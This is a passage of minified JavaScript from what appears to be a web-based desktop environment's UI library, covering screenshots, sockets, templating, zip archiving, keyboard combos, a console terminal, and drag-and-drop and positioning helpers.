f=r.querySelectorAll("iframe"),p=r.querySelectorAll("canvas"),m=f.length+p.length;if(m){if(f.length){var h=t.querySelectorAll("iframe");$io.arr.each(f,(function(e,t){n(h[t].contentDocument,{width:h[t].clientWidth,height:h[t].clientHeight},(function(n,o,s){e.parentNode.replaceChild(s.image,e),s.image.style.cssText=window.getComputedStyle(h[t],"").cssText,s.image.style.width=h[t].clientWidth+"px",s.image.style.height=h[t].clientHeight+"px",0==--m&&a(r.outerHTML,i)}))}))}if(p.length){var g=t.querySelectorAll("canvas");$io.arr.each(p,(function(e,t){var n=new Image;n.src=g[t].toDataURL(),e.parentNode.replaceChild(n,e),n.style.cssText=window.getComputedStyle(g[t],"").cssText,0==--m&&a(r.outerHTML,i)}))}}else a(r.outerHTML,i)}})),{refresh:function(e){a(r.outerHTML,e)},destroy:function(){canvas=null,html=null,r=null}}}n.config=function(e){$extend(t,e)},e.$screenshot=n}(this),function(e){"use strict";function t(e){var t={};this.on=function(e,n){return t[e]=t[e]||[],t[e].push(n),this},this.send=function(e,t){return this.conn.send(t),this},this.connect=function(){"function"==typeof MozWebSocket?this.conn=new MozWebSocket(e):this.conn=new WebSocket(e),this.conn.onmessage=function(e){n("message",e.data)},this.conn.onclose=function(){n("close",null)},this.conn.onopen=function(){n("open",null)}},this.disconnect=function(){this.conn.close()};var n=function(e,n){var o=t[e];if(void 0!==o)for(var i=0;i<o.length;i++)o[i](n)}}e.$socket=function(e){return new t(e)}}(this),function(e){"use strict";var t={"\\":"\\\\","\n":"\\n","\r":"\\r","'":"\\'"};e.$template=function(e){return e=e||"",new Function("_","return '"+e.replace(/[\\\n\r']/g,(function(e){return t[e]})).replace(/\{{#if\s*(.*?)\s*}}([\s\S]*?){{\/if}}/g,"' + (_.$1?'$2':'') + '").replace(/\{{#unless\s*(.*?)\s*}}([\s\S]*?){{\/unless}}/g,"' + (_.$1?'':'$2') + '").replace(/\{{\s*([\w\.]+)\s*}}/g,"' + (_.$1==null?'':_.$1) + '")+"'")}}(window),function(e){"use strict";e.$archive=function(e,t){t=t||$fs.utils.getName(e+"")||"derp";var n=$alert.progress("Creating Archive...","Archive");function o(e){$file.download(e,t+".zip")}function i(e,t){n.update(e/t*100)}function r(e){console.error(e)}$loader(["/c/libs/zip/zip.js","/c/libs/zip/zip-fs.js"],(function(){zip.workerScriptsPath="/c/libs/zip/";var n=new zip.fs.FS;function a(e,o){t=t||$fs.utils.getName(e);var i=$fs.utils.getPathObj(e);i?function e(t,n,o,i){$io.enum([o],(function(o,i,r){"."!==i&&".."!==i?$fs.utils.isShortcut(i)||"object"!=typeof o?$file.open(t+"/"+i,"Blob",(function(e){n.addBlob(i,e),r()})):e(t+"/"+i,n.addDirectory(i),o,r):r()}),(function(){i()}))}(i.cwd,n.root.addDirectory($fs.utils.getName(i.cwd)),i.obj,o):$file.open(e,"Blob",(function(e){n.root.addBlob(this.name,e),o()}))}function s(){n.root.exportBlob(o,i,r)}"string"==typeof e?a(e,s):$io.enum(e,(function(e,n,o){if($io.isElement(e)){t=null;var i=e.getAttribute("data-exe"),r=e.getAttribute("data-path");$fs.utils.exist(i)?a(i,o):a(r,o)}else a(e,o)}),s)}))}}(this),function(e){"use strict";var t;t=Element.prototype,Element&&!t.matches&&(t.matches=t.matchesSelector||t.mozMatchesSelector||t.msMatchesSelector||t.oMatchesSelector||t.webkitMatchesSelector);var n,o,i,r,a,s,l=document.documentElement,c=String.fromCharCode,u=!1,d=[],f=[{data:{}}],p=["⌫ Bksp Backspace","↲ Enter","⇧ Shift","⇫ Caps CapsLock","Option Alt","Ctrl Control","🍐 ♥  ⌘ Cmd Win Meta Super Command OS","⇞ PgUp PageUp","⇟ PgDn PgDown PageDown","↖ Home","↘ End","↤ ← Left ArrowLeft","↥ ↑ Up ArrowUp","↦ → Right ArrowRight","↧ ↓ Down ArrowDown","⎵ Space Spacebar","Del Delete","Ins Insert","Print PrintScr PrintScreen","☰ Menu Apps Context_menu ContextMenu","ScrLk Scroll ScrollLock","AltGr AltGraph","Break Pause","Esc Escape","Multiply *","Add +","Subtract -","Decimal Period .","Divide Slash /","Backslash \\","Equals =","Semicolon ;","Comma ,","Hash Sharp Hashtag Octothorpe #"],m={3:"Enter",8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:"Spacebar",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",44:"PrintScreen",45:"Insert",46:"Delete",91:"OS",92:"OS",93:"ContextMenu",96:"Insert",108:"Enter",124:"PrintScreen",127:"Delete",144:"NumLock",145:"ScrollLock",224:"OS",225:"AltGraph",63232:"ArrowUp",63233:"ArrowDown",63234:"ArrowLeft",63235:"ArrowRight",63272:"Delete",63273:"Home",63275:"End",63276:"PageUp",63277:"PageDown",63302:"Insert"},h={},g={},v={},y={},_={},b={},w={};for(s=1;s<=12;s++)m[s+111]=m[s+63235]="F"+s;function x(e){return e.preventDefault?e.preventDefault():e.returnValue=!1,!1}function $(e,t){var s=w[u&&A[n]?"normal":u?a:A[n]?n:"normal"][A[o]?o:A[i]?i:A[r]?r:"normal"];return t&&!s[e]&&(s[e]=t),s[e]}function E(e){var t=$(e);return{key:t?c(t):c(e)[A[n]||u?"toUpperCase":"toLowerCase"](),code:t||e}}function k(e,t){if(t){var n,o;if("keydown"===(t.data.event=e).type){if(!1===t.repeat&&e.repeat)return h=null,void x(e);t.data.code=e.which,t.data.key=y[e.which]||null,t.data.char="",t.preventDefault&&(e.ctrlKey||t.data.key)&&(x(e),e.stopImmediatePropagation()),(e.ctrlKey||e.shiftKey||t.data.key)&&(h(),h=null,t.data.safe=!0)}if("keypress"===e.type){t.data.char=c(e.which),$(t.data.code,e.which);var i=function(e){var t=c(e.which);if(t.toUpperCase()!==t.toLowerCase())return e.shiftKey&&t.toLowerCase()===t||!e.shiftKey&&t.toUpperCase()===t}(e);if("boolean"==typeof i&&(u=i),!t.repeat&&e.repeat||t.data.safe)return void(h=null);t.data.key||(t.data.code=e.which,t.data.key=c(e.which))}if("keyup"===e.type){h=null;var r=E(e.which);t.data.code=r.code,t.data.char=r.key,t.data.key=y[e.which]||r.key,A[t.data.key]=!1,p(t.up);var a=t.data.key;for(var s in w)if(w.hasOwnProperty(s))for(var l in w[s])if(w[s].hasOwnProperty(l)&&(a===s||a===l))for(var d in w[s][l])w[s][l].hasOwnProperty(d)&&(t.data.code=w[s][l][d],t.data.key=c(t.data.code),A[t.data.key]=!1);for(var f in t.data)t.data.hasOwnProperty(f)&&delete t.data[f];t.preventDefault&&x(e)}return t.timer=setTimeout(h,1),!0!==t.stopPropagation&&void 0}function p(o){if(o){var i=o.call(t.thisArg,t.data.key,n=n||function(e){var t=$extend({},e.data);return t.session=e,t.w3c=b[e.data.key]||e.data.key,t.loc=t.w3c,t.pos="Standard",e.data.event&&e.data.event.location&&(3===e.data.event.location?(t.pos="Numpad",t.loc="Numpad"+t.w3c):e.data.char||(t.pos=2===e.data.event.location?"Right":"",t.loc=t.w3c+t.pos)),t.CapsLock=u,t}(t));(t.preventDefault||!1===i)&&x(e)}}function m(e){if(e){var n=t.possibleCombo.indexOf(e);-1<n&&t.possibleCombo.splice(n,1),e.then&&m(e.then)}}function h(){if(!t.data.key){var e=E(t.data.code);t.data.code=e.code,t.data.char=t.data.key=e.key}for(var n in A[t.data.key]=!0,p(t.down),function(e){o=o||A.keys;for(var n=0,i=e.length;n<i;n++){for(var r=!1,a=0,s=e[n].keys.length;a<s;a++){if(-1===o.indexOf(e[n].keys[a])){if(t.comboStrict){r=!1,m(e[n].parent);break}if(-1===o.indexOf(e[n].keys[a].toUpperCase())){r=!1,m(e[n].parent);break}}r=!0}if(r)if(e[n].run){if(p(e[n].run),m(e[n].parent),t.stopPropagation||t.uniqueCombo)break}else e[n].then&&-1===t.possibleCombo.indexOf(e[n].then)&&t.possibleCombo.push(e[n].then)}}(t.combo?t.combo.concat(t.possibleCombo):t.possibleCombo),t.data)t.data.hasOwnProperty(n)&&delete t.data[n]}}function S(e){"number"!=typeof(e=e||window.event).which&&(e.which=e.keyCode);for(var t=0,n=d.length;t<n&&!1!==k(e,d[t]);t++);}function L(e){var t=e.target;if(d.length=0,f.length)for(;t&&1===t.nodeType;){for(var n=0,o=f.length;n<o;n++){var i=f[n];i.selector?t.matches(i.selector)&&d.push($extend({thisArg:t},i)):t===i.el&&d.push($extend({thisArg:t},i))}t=t.parentNode}}function A(e){var t={data:{},possibleCombo:[]};"string"==typeof e?t.selector=e:e&&1===e.nodeType?t.el=e:t.el=l;var n=f.push(t);t.stack=new Error("stack").stack.split("\n"),t.stack.shift(),t.stack=t.stack.join("\n");var o={session:t,config:function(e){return e?($extend(t,e),o):t},up:function(e){return t.up=e,o},down:function(e){return t.down=e,o},combo:function(e){var n=function(e){var t=[];for(var n in e)if(e.hasOwnProperty(n))for(var o=n.replace(/\+\+/g,"+add").split(", "),i=0,r=o.length;i<r;i++){var a={};t.push(a);for(var s=o[i].split(" "),l=a,c=0,u=s.length;c<u;c++){for(var d=s[c].split("+"),f=0,p=d.length;f<p;f++)d[f]=_[d[f]]||_[h[d[f].toLowerCase()]]||h[d[f].toLowerCase()]||d[f];l.keys=d,0!==c&&1<s.length&&(l.parent=a),c===s.length-1?l.run=e[n]:l=l.then={}}}return t}(e);return t.combo?t.combo=t.combo.concat(n):t.combo=n,t.combo=t.combo.sort((function(e,t){return t.keys.length-e.keys.length})),o},destroy:function(){f.splice(n-1,1)}};return o.set=o.combo,o}!function(){for(var e=0,t=p.length;e<t;e++)for(var s=p[e].split(" "),l=s.pop(),c=s.length-1;0<=c;c--)s[c].length<3?(v[l]=s[c],v[l+"Right"]=s[c]):s[c].length<l.length&&(g[l]=s[c],g[l+"Right"]=s[c]),h[s[c].toLowerCase()]=l;var u="ctrl super altgr left up right down space caps scroll print menu esc ins del".split(" "),d=u[0].toLowerCase()===u[0]?"toLowerCase":u[0].toUpperCase()===u[0]?"toUpperCase":null;for(e=0,t=u.length;e<t;e++)_[h[u[e].toLowerCase()]]=u[e];for(var f in m)m.hasOwnProperty(f)&&(y[f]=_[m[f]]||(d?m[f][d]():m[f]),_[m[f]]=y[f],b[y[f]]=m[f]);for(var f in n=_.Shift,o=_.Alt,i=_.AltGraph,r=_.Control,a=_.CapsLock,w)w.hasOwnProperty(f)&&delete w[f];w.normal={normal:{}},w.normal[o]={},w.normal[i]={},w.normal[r]={},w[n]={normal:{}},w[n][o]={},w[n][i]={},w[n][r]={},w[a]={normal:{}},w[a][o]={},w[a][i]={},w[a][r]={}}(),l.addEventListener("keydown",S,!1),l.addEventListener("keypress",S,!1),l.addEventListener("keyup",S,!1),l.setAttribute("tabindex","0"),l.addEventListener("focus",(function(e){L(e)}),!0),l.addEventListener("click",(function(e){L(e)}),!0),l.focus(),l.addEventListener("focusout",(function(e){setTimeout((function(){if(!document.hasFocus())for(var e in A)A.hasOwnProperty(e)&&(A[e]=!1)}),0)}),!1),l.addEventListener("dblclick",(function(e){for(var t in A)A.hasOwnProperty(t)&&(A[t]=!1)}),!1),Object.defineProperties(A,{alias:{value:{small:function(e){return g[e]||e},symbol:function(e){return v[e]||g[e]||e},favorite:function(e){return y[e]||e}}},keys:{get:function(){var e,t=[];for(e in A)A.hasOwnProperty(e)&&A[e]&&t.push(e);return t}},activate:{value:function(){console.log("active")}}}),e.$key=A}(this),function(e){"use strict";e.$gamepad=function(e){console.log(e)}}(this),function(e){"use strict";var t={},n=0,o={debounce:0,noscroll:!1,handler:null,delay:0};function i(e,i,r){if("object"==typeof e&&!(e instanceof HTMLElement))return o=e;var a,s,l=e,c=$extend({},o,r),u=c.delayy,d=c.handler;if(e+""===e&&((e=document.getElementById(l))||(e=document.querySelector(l))),e){t[++n]=i,e.setAttribute("data-wheel-id",n);var f=function(o){var i=o.wheelDelta?o.wheelDelta/40:o.detail?-o.detail:0;return t[n].call(e,i,o),!1};if(c.acceleration){var p=0,m=!0;a=setInterval((function(){(p-=.1*p)<0&&(p=0)}),c.acceleration),f=function(o){p+=1;var i=o.wheelDelta?o.wheelDelta/40:o.detail?-o.detail:0;return m=0<i?(!1===m&&(p=1),!0):(!0===m&&(p=1),!1),t[n].call(e,i,p,o),!1}}return c.throttle&&(h=$io.fn.throttle(h,c.throttle)),c.debounce&&(h=$io.fn.debounce(h,c.debounce)),e.addEventListener("mouseenter",u?g:y,!1),e.addEventListener("mouseleave",u?v:_,!1),{destroy:function(){e.removeEventListener("mouseenter",u?g:y,!1),e.removeEventListener("mouseleave",u?v:_,!1),clearTimeout(s),clearInterval(a);var n=e.getAttribute("data-wheel-id");n&&t[n]&&delete t[n],e.removeEventListener("mousewheel",h,!1),e.removeEventListener("DOMMouseScroll",h,!1),console.log("$wheel destroy : ",e.getAttribute("data-wheel-id"))}}}function h(e){e=window.event||e,d?d.isEqualNode(e.target)&&(e.preventDefault(),f(e)):(c.noscroll&&e.preventDefault(),f(e))}function g(e){e.preventDefault(),clearTimeout(s),s=setTimeout((function(){y()}),u)}function v(e){e.preventDefault(),_(),clearTimeout(s)}function y(){e.addEventListener("mousewheel",h,!1),e.addEventListener("DOMMouseScroll",h,!1)}function _(){e.removeEventListener("mousewheel",h,!1),e.removeEventListener("DOMMouseScroll",h,!1)}}i.scale=function(e,t){var n=$extend({negatif:!1},t);e.scaleX=1,e.scaleY=1;var o=e.offsetWidth,r=e.offsetHeight,a=i(e,(function(e,t){var i=this.scaleX,a=this.scaleY;0<e?(this.scaleX+=.1*this.scaleX,this.scaleY+=.1*this.scaleY):(this.scaleX-=.1*this.scaleX,this.scaleY-=.1*this.scaleY),n.negatif?(this.scaleX<.1&&(this.scaleX=.1),this.scaleY<.1&&(this.scaleY=.1)):(this.scaleX<1&&(this.scaleX=1),this.scaleY<1&&(this.scaleY=1)),this.style.width=o*this.scaleX+"px",this.style.height=r*this.scaleY+"px";var s=1-this.scaleX/i,l=1-this.scaleY/a,c=this.offsetLeft,u=this.offsetTop;c+=(t.clientX-this.offsetLeft)*s,u+=(t.clientY-this.offsetTop)*l,this.style.top=u+"px",this.style.left=c+"px"}));return{destroy:function(){a.destroy(),delete e.scaleW,delete e.scaleH}}},e.$wheel=i}(this),function(e){"use strict";for(var t,n=["clear","error","error","succes","fail","pass","warn","info","bold","italic","red","blue","green","white","yellow","cyan","magenta","html","autolink","code","pad","right","center","repeat","stack","save","stay","id","fast","group","noop","obj","end"],o={el:null},i={},r="",a=0,s=n.length;a<s;a++)o[n[a]]="",i[n[a]]=function(e){return function(){o[e]="1"}}(n[a]);function l(e,n,i){if(o.clear)return o.el.innerHTML="",void(o.clear="");if(o.repeat&&(e=e.repeat(o.cols),o.repeat=""),o.code&&(e=$io.str.hilit(e),o.code=""),o.pass&&(e="✔ "+e,r+="ui_log__green",o.pass=""),o.fail&&(e="✘ "+e,r+="ui_log__red",o.fail=""),o.info&&(e="ℹ "+e,r+="ui_log__blue",o.info=""),o.italic&&(r+=" italic",o.italic=""),o.bold&&(r+=" bold",o.bold=""),o.white&&(r+=" ui_log__white",o.white=""),o.yellow&&(r+=" ui_log__yellow",o.yellow=""),o.cyan&&(r+=" ui_log__cyan",o.cyan=""),o.magenta&&(r+=" ui_log__magenta",o.magenta=""),o.blue&&(r+=" ui_log__blue",o.blue=""),o.red&&(r+=" ui_log__red",o.red=""),o.succes&&(r+=" ui_log__green",o.succes=""),o.green&&(r+=" ui_log__green",o.green=""),o.error&&(r+=" ui_log__red js_error",o.error=""),o.obj)return o.obj="",void function e(t,n){for(var o in t){var i=t[o];if(o==n)return;"string"==typeof i||"number"==typeof i||"boolean"==typeof i?l.pad(o,i+"","."):$io.is.Object(i)&&e(i,n)}}(e,n);if("Error"===$io.type(e)&&(e=e.constructor.name+"\n"+e.message+$io.str.autolink(e.stack)),o.pad){var a;i?a=i:(a=n,n="");var s=o.cols-3-(e.length+(n||"").length+(n?2:1));(e=e+" "+a.repeat((3+(0<=s?s:0))/a.length)+(n?" "+n:"")).length>o.cols&&(e=e.match(new RegExp(".{1,"+o.cols+"}","g")).join("\n")),o.pad=""}else n&&(e=$io.arg.arr(arguments).join(", "));return o.el?((t=document.createElement("div")).innerHTML=function(e){return"string"==typeof e?e:$io.isNumber(e)?'<span class="sh_number">'+e+"</span>":void 0===e?"undefined":null===e?"null":"function"==typeof e?$io.str.hilit($io.fn.str(e)):$io.isObject(e)||$io.isArray(e)?$io.str.hilit($io.stringify(e,2)):"function"==typeof e.constructor?"<span class=sh_init>"+e.constructor.name+"</span> "+$io.str.hilit($io.stringify(e,2),!0):e}(e),t.className=r,o.el.appendChild(t),l.trigger("addline"),r="",t):void 0}l.config=function(e){return $extend(o,e),l},$watch(l),e.$log=$chain(l,i,i)}(this),function(e){"use strict";function t(e){e.scrollTop=e.scrollHeight}o.clearhistory=function(){n.length=0};var n=e.$store?$store(".config/history.json",[],(function(e){n=e}),(function(){return n})):[];function o(o,i){var r=$extend({cols:59,exe:$noop,prompt:">",history:n},i),a=document.createElement("code"),s=document.createElement("div"),l=document.createElement("div"),c=document.createElement("span"),u=document.createElement("textarea");if(o){r.prompt+="&nbsp;",c.innerHTML=r.prompt,u.innerHTML="",u.spellcheck=!1,u.rows="1",u.style.outline="0 none",u.style.boxShadow="0 0 transparent",u.style.textShadow="0 0 transparent",u.style.border="0 none",u.style.verticalAlign="top",u.style.resize="none",u.style.padding="0",u.style.margin="0",u.style.height="auto",u.style.width="100%",u.style.color="inherit",u.style.font="inherit",u.style.fontSize="inherit",u.style.background="transparent",u.style.overflow="hidden",u.style.textIndent="0",l.style.display="table",l.style.tableLayout="fixed",u.style.display="table-cell",c.style.display="table-cell",c.style.width="1%",c.style.whiteSpace="nowrap",l.appendChild(c),l.appendChild(u),a.appendChild(s),a.appendChild(l),a.style.display="block",a.style.width=r.cols+"ch",a.style.whiteSpace="pre-wrap",a.style.wordBreak="break-word",a.style.wordWrap="break-word",o.appendChild(a),o.style.overflowY="scroll",r.rows&&(o.style.height=r.rows+"em"),$log.on("addline",(function(){t(o)})),o.addEventListener("mouseup",v,!1),o.addEventListener("contextmenu",v,!1),u.addEventListener("mouseup",(function(e){e.stopPropagation?e.stopPropagation():e.cancelBubble=!0,e.stopImmediatePropagation(),g()}),!1),u.addEventListener("paste",(function(e){setTimeout((function(){y(u)}),0)}),!1);var d=0,f=!1,p=$key(o).down((function(e,t,n){y(u);var o=r.history.length;if(!1===h.onkey(e,u.value))return!1;if("enter"==e){var i=$io.str.trim(u.value);if(!i)return h.log(r.prompt),!1;if(u.value="",u.style.height="auto",d=0,!1===h.onenter(i))return!1;if(h.log(r.prompt+i),r.history[o-1]!=i&&r.history.push(i),!r.exe.call(h,i))try{h.log(eval.call(window,i))}catch(n){h.log.error(n.message+"\n")}return!1}if(u.value||(f=!1),!f){if("up"==e)return o<++d&&(d=o),u.value=r.history[o-d]||"",y(u),!1;if("down"==e)return--d<0&&(d=0),u.value=r.history[o-d]||"",y(u),!1}})),m=$log.config({cols:r.cols,el:s}),h={cli:!0,cfg:r,destroy:function(){p.destroy(),this.ondestroy(),console.log("@todo : terminal destroy")},setFocus:v,ondestroy:$noop,onenter:$noop,onkey:$noop,prompt:c,input:u,log:m};return h}function g(){$log.config({cols:r.cols,el:s})}function v(){e.$selection&&($selection.get()||setTimeout((function(){u.focus(),g()}),200))}function y(e){!function(e){e.style.height=e.scrollHeight+"px"}(e),t(e)}}e.$cli=o}(this),function(e){"use strict";var t;function n(e,t){document.documentElement.addEventListener(e,t,!1)}function o(e,t){document.documentElement.removeEventListener(e,t,!1)}function i(e){var t=e.changedTouches?e.changedTouches[0]:null;return t?{x:t.clientX,y:t.clientY}:{x:e.clientX,y:e.clientY}}function r(e,t){return!(e.right<=t.left||e.left>=t.right||e.bottom<=t.top||e.top>=t.bottom)}function a(e,t,a){if("object"==typeof t&&(a=t,t=null),"string"==typeof e&&(e=document.querySelector(e)),!e)throw new Error("$box : element missing");var s,l,c,u,d,f=$extend({distance:10,oninit:$noop,onstart:$noop,ondraw:function(e,t,n){},onstop:$noop},a),p=e;d=t?function(e){for(var n=e.target;n&&1==n.nodeType&&!n.matches(t);)n=n.parentNode;n&&9!=n.nodeType&&b.call(p=n,e)}:b;var m=document.createElement("div");m.className="ui_select_box",m.style.position="fixed",m.style.zIndex=9999,m.style.border="1px dotted #000",m.style.backgroundColor="rgba(0,0,0,.1)",m.style.display="none";var h={right:0,left:0,bottom:0,top:0};function g(){if(f.target){for(var e=p.querySelectorAll(f.target),t=[],n=0,o=e.length;n<o;n++)r(h,e[n].getBoundingClientRect())&&t.push(e[n]);return t}}var v=0,y=!1;function _(e){var t=i(e);s=t.x-c,l=t.y-u;var n=Math.abs(s),o=Math.abs(l);h.top=0<l?u:t.y,h.left=0<s?c:t.x,m.style.top=h.top+"px",m.style.left=h.left+"px",(n>f.distance||o>f.distance)&&v===p.scrollTop&&(e.preventDefault(),y||function(e){f.onstart.call(p,e,m),y=!0}(e),m.style.display="block",h.right=h.left+n,h.bottom=h.top+o,m.style.width=n+"px",m.style.height=o+"px",f.ondraw.call(p,e,g()))}function b(e){if(this.isEqualNode(e.target||e.srcElement)){v=p.scrollTop;var t=i(e);p.appendChild(m),c=t.x,u=t.y,_(e),n("mousemove",_),n("touchmove",_),n("mouseup",w),n("touchend",w),n("contextmenu",w),f.oninit.call(p,e,m)}}function w(e){o("mousemove",_),o("touchmove",_),o("mouseup",w),o("touchend",w),o("contextmenu",w),f.onstop.call(p,e,g()),m.style.display="none",p.removeChild(m),y=!1,v=p.scrollTop}return e.addEventListener("mousedown",d,!1),e.addEventListener("touchstart",d,!1),{destroy:function(){e.removeEventListener("mousedown",d,!1),e.removeEventListener("touchstart",d,!1)}}}t=Element.prototype,Element&&!t.matches&&(t.matches=t.matchesSelector||t.mozMatchesSelector||t.msMatchesSelector||t.oMatchesSelector||t.webkitMatchesSelector),a.overlap=r,e.$box=a}(this),function(e){"use strict";function t(e,t){document.documentElement.addEventListener(e,t,!1)}function n(e,t){document.documentElement.removeEventListener(e,t,!1)}function o(e){var t=e.changedTouches?e.changedTouches[0]:null;return t?{x:t.clientX,y:t.clientY}:{x:e.clientX,y:e.clientY}}function i(e,r,a){if("object"==typeof r&&(a=r,r=null),"string"==typeof e&&(e=document.querySelector(e)),!e)throw new Error("$drag : element missing");var s,l,c,u,d,f,p,m,h,g,v,y=$extend({constrain:!1,ghost:!1,grid:!1,position:"absolute",handle:null,distance:5,oninit:$noop,onstart:$noop,ondrag:$noop,onstop:$noop,ondrop:$noop},a),_=0,b=0,w=r?$delegate(r,$):$;if("function"==typeof y.ghost&&Object.defineProperty(y,"ghost",{get:function(){return a.ghost(y)}}),"function"==typeof y.grid&&Object.defineProperty(y,"grid",{get:a.grid}),i.elem=e,i.zone=null,i.isDragging=!1,r)h=g=v=e;else for(v=y.handle||e,g=h=e.parentNode;g.parentNode&&9!==g.parentNode.nodeType&&"static"==window.getComputedStyle(h,null).position;)g=g.parentNode;function x(e){var t=o(e);s=t.x-d,l=t.y-f,(i.isDragging||Math.abs(s)>y.distance||Math.abs(l)>y.distance)&&(k(e),i.isDragging||function(e){if(y.ghost)document.body.appendChild(i.ghost);else{var t=getComputedStyle(i.elem,null);if(u=i.elem.offsetLeft-(parseInt(t.marginLeft)||0),c=i.elem.offsetTop-(parseInt(t.marginTop)||0),"absolute"===y.position||"fixed"===y.position)i.elem.style.position="fixed"==t.position?"fixed":"absolute",i.elem.style.boxSizing=i.elem.style.webkitBoxSizing=i.elem.style.MozBoxSizing="border-box",i.elem.style.height=i.elem.offsetHeight+"px",i.elem.style.width=i.elem.offsetWidth+"px",i.elem.style.left=u+"px",i.elem.style.top=c+"px";else{var n=parseInt(t.left)||0,o=parseInt(t.top)||0;y.constrain&&(p=p-c+o,_=_-c+o,m=m-u+n,b=b-u+n),u=n,c=o,i.elem.style.position="relative",i.elem.style.left=u+"px",i.elem.style.top=c+"px"}i.elem.classList.add("ui_is_dragging")}y.onstart.call(i.elem,e),i.isDragging=!0}(e),s+=u,l+=c,y.constrain&&(s=m<s?m:s<b?b:s,l=p<l?p:l<_?_:l),y.grid&&(s=~~((s+y.grid[0]/2)/y.grid[0])*y.grid[0],l=~~((l+y.grid[1]/2)/y.grid[1])*y.grid[1]),y.ghost?i.ghost&&(i.ghost.style.left=s+"px",i.ghost.style.top=l+"px"):(i.elem.style.left=s+"px",i.elem.style.top=l+"px"),i.x=s,i.y=l,y.ondrag.call(i.elem,e,s,l),y.zone&&function(e,t){var n=document.elementFromPoint(t.x,t.y);for(var o in y.zone)if(y.zone.hasOwnProperty(o)){for(var r=y.zone[o],a=n;a&&1==a.nodeType&&!a.matches(o);)a=a.parentNode;a&&9!=a.nodeType?(i.zone!==a&&(r.leave&&i.zone&&r.leave(e,i.zone,i.elem),r.enter&&r.enter(e,a,i.elem)),i.zone=a):i.zone&&(r.leave&&r.leave(e,i.zone,i.elem),i.zone=null),r.move&&i.zone&&r.move(e,i.zone,i.elem)}}(e,t))}function $(n,a){k(n),i.elem=a||(r?this:e);var s=o(n);if(d=s.x,f=s.y,y.ghost){i.ghost=i.createGhost(i.elem);var l=i.elem.getBoundingClientRect();u=l.left,c=l.top}else i.ghost=null,u=i.elem.offsetLeft,c=i.elem.offsetTop;i.initialPos.x=u,i.initialPos.y=c,x(n),t("mousemove",x),t("touchmove",x),t("mouseup",E),t("touchend",E),t("contextmenu",k),y.oninit.call(i.elem,n)}function E(e){if(n("mousemove",x),n("touchmove",x),n("mouseup",E),n("touchend",E),n("contextmenu",k),i.isDragging){var t=!1;y.zone&&i.elem&&(t=function(e){var t=!1,n=o(e);for(var r in document.elementFromPoint(n.x,n.y),y.zone)if(y.zone.hasOwnProperty(r)){var a=y.zone[r];a.drop&&i.zone&&(t=!0,a.drop(e,i.zone,i.elem))}return t}(e)),t||y.ondrop.call(i.elem,e),y.onstop.call(i.elem,e)}i.elem&&i.elem.classList.remove("ui_is_dragging"),i.zone=null,i.elem=null,i.initialPos.x=null,i.initialPos.y=null,i.x=null,i.y=null,i.cfg=null,i.isDragging=!1}function k(e){document.activeElement.blur(),e.preventDefault()}return p=g.offsetHeight-e.offsetHeight-.5,m=g.offsetWidth-e.offsetWidth-.5,v.addEventListener("mousedown",w,!1),v.addEventListener("touchstart",w,!1),{destroy:function(){i.isDragging=!1,i.removeGhost(),E(),v.removeEventListener("mousedown",w,!1),v.removeEventListener("touchstart",w,!1)}}}i.createGhost=function(e,t){e.classList.add("ui_is_dragging");var n=e.cloneNode(!0),o=n.getElementsByTagName("*"),i=e.getElementsByTagName("*");n.style.cssText=getComputedStyle(e,null).cssText;for(var r=0,a=o.length;r<a;r++)o[r].style.cssText=getComputedStyle(i[r],null).cssText,o[r].style.pointerEvents="none";return n.classList.add("js-ghost"),n.style.pointerEvents="none",n.style.position="fixed",n.style.zIndex=9999,n.style.opacity=".7",e.classList.remove("ui_is_dragging"),n},i.initialPos={x:null,y:null},i.revert=function(e,t){$transition.revert(i.ghost||i.elem,i.initialPos,(function(){i.ghost&&i.removeGhost()}))},i.removeGhost=function(){i.ghost&&i.ghost.parentNode&&i.ghost.parentNode===document.body&&document.body.removeChild(i.ghost),i.ghost=null},e.$drag=i}(this),function(e){"use strict";var t=function(){var e,t=document.createElement("div"),n=["Webkit","Moz","O","ms"];if("transition"in t.style)return"transition";for(e=0;e<n.length;e++)if(n[e]+"Transition"in t.style)return n[e]+"Transition";return"transition"}();function n(e){console.log(e)}n.revert=function(e,n,o,i){if(void 0===i&&(i=300),e&&null!==n.x){var r=e.style[t];e.style[t]="left "+i+"ms ease, top "+i+"ms ease",e.style.left=n.x+"px",e.style.top=n.y+"px",setTimeout((function(){e.style[t]=r,"function"==typeof o&&o()}),i)}},e.$transition=n}(this),function(e){"use strict";function t(e,t,o){return n(e=e.replace(/([a-z]+)([+-])?/g,(function(e,t,n){return("top"==t?"bottom":"bottom"==t?"top":"right"==t?"left":"left"==t?"right":t)+("+"==n?"-":"-"==n?"+":"")})),t,o)}function n(e,t,n){var o=n||{top:0,left:0},i=t.offsetHeight||0,r=t.offsetWidth||0;return e.replace(/(?:(right|left|center)(?:([+-])(\d+)(%)?)?)? ?(?:(top|bottom|center)(?:([+-])(\d+)(%)?)?)?/,(function(e,t,n,a,s,l,c,u,d){l||(l="center"),t||(t="center"),"right"==t&&(o.left+=r),"center"==t&&(o.left+=r/2),"bottom"==l&&(o.top+=i),"center"==l&&(o.top+=i/2),s&&(a=r/100*+a),d&&(u=i/100*+u),a&&(o.left=o.left-+(n+a)),u&&(o.top=o.top-+(c+u))})),o}e.$pos=function(e,o){if(!e)throw new Error("$pos: element is undefined");e.style.position="fixed";for(var i,r=e.parentNode,a=window.getComputedStyle(r,null);r.parentNode&&9!==r.parentNode.nodeType&&"none"==a.transform&&"none"==a.perspective;)r.getAttribute("data-ui-menu-scroller"),r=r.parentNode,a=window.getComputedStyle(r,null);i=r.getBoundingClientRect();var s,l,c,u,d,f,p={my:"left top",at:"left 